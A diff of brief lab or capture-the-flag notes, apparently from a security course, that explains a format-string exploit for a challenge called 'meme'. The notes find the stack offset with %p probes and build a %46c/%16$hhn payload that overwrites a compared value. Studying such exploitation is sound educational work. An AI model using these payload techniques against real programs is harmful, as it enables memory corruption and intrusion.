@@ -21,7 +21,7 @@ e.g. in memory it might look something like
 
 ## meme
 
-* compare "COMP6447" locates at rbp-0x219 with "2tRi****" load from mem for first 4 characters, so try to overwrite rbp-0x219 to 2tRi
+* compare "COMPLMAO" locates at rbp-0x219 with "2tRi****" load from mem for first 4 characters, so try to overwrite rbp-0x219 to 2tRi
 * offset: AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p, it turns out the 8th offset is usable
 * payload = b"%46c...." + b"%16$hhn."  **.** is for the aligh, 2 with ascii decimal = 50 coz have 4 dots, so need %46c which means 46 spaces and 4 dots characters be written, and we wrote 50 to the address: payload += p64(target_address)
 	* why 46c: align
